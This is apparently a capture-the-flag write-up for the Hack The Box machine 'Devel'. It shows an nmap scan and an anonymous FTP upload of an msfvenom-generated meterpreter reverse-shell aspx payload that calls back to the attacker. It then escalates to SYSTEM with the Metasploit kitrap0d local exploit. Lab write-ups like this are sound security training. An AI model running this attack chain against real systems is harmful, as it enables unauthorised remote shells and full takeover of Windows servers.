# Devel
### Info:
OS: Windows 7 x86 <br>
IP: 10.10.10.5 <br>
Difficulty : Easy-Medium <br>
### Exploitation:

```nmap -sC -sV -oA nmap 10.10.10.5``` <br>

gives us the results : <br>

```
# Nmap 7.70 scan initiated Mon Jan  7 15:45:01 2019 as: nmap -sC -sV -oA nmap 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.32s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
We see a FTP server at port 21 and a Microsoft IIS httpd 7.5 at port 80 <br>
Trying connecting ftp with username: <b>anonymous</b> and pass: <b>anything can be inserted</b> gives us access to the ftp client.<br>
<b>Payload creation</b> <br>(we used aspx as it had iis server 7.5 which was kind of new so we didnot considered using asp)
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.16 LPORT=4449 -f aspx -o dominat0r.aspx
```
Inserting this on the ftp server : <br> `Put dominat0r.aspx` <br>
Using msfconsole we got the shell :
```
Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.16.16:4449 -> 10.10.10.5:49160 (10.10.10.5)

```
### Privilege Escalation 
By default, the working directory is set to ​c:\windows\system32\inetsrv​​, which the IIS user does not have write permissions for. Navigating to ​c:\windows\TEMP ​​is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation.
<br>
Using `> search suggest` to look for modules for privilege escalation we get : <br>
```
Matching Modules
================

   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   auxiliary/server/icmp_exfil                                       normal  ICMP Exfiltration Service
   exploit/windows/browser/ms10_018_ie_behaviors    2010-03-09       good    MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   exploit/windows/smb/timbuktu_plughntcommand_bof  2009-06-25       great   Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   post/multi/recon/local_exploit_suggester                          normal  Multi Recon Local Exploit Suggester
   post/osx/gather/enum_colloquy                                     normal  OS X Gather Colloquy Enumeration

```
and we ran `post/multi/recon/local_exploit_suggester` which gave local exploits for x86/windows :
```
msf post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 39 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
we used the first exploit `ms10_015_kitrap0d` which opened 2nd session for us:
```
msf exploit(windows/local/ms10_015_kitrap0d) > sessions

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.16.16:4449 -> 10.10.10.5:49160 (10.10.10.5)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.16.16:4449 -> 10.10.10.5:49162 (10.10.10.5)
```
The flags can now be obtained from c:\Users\babis\Desktop\user.txt.txt and c:\Users\Administrator\Desktop\root.txt.txt
### Things Learned :
Basic Windows privilege escalation techniques <br>
Exploiting weak credentials
